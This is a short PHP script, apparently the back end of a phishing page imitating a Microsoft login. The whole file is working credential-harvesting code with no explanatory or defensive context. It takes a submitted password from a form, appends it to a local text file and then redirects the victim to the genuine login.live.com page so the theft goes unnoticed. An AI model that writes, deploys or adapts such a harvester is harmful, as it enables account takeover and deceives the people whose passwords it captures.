<?php

$contraseña =$_POST["contraseña"];

$contenido="
Contraseña: $contraseña
";

$archivo = fopen("info.txt", "a");
fwrite($archivo, $contenido);
fclose($archivo);
header("Location: https://login.live.com/")
?>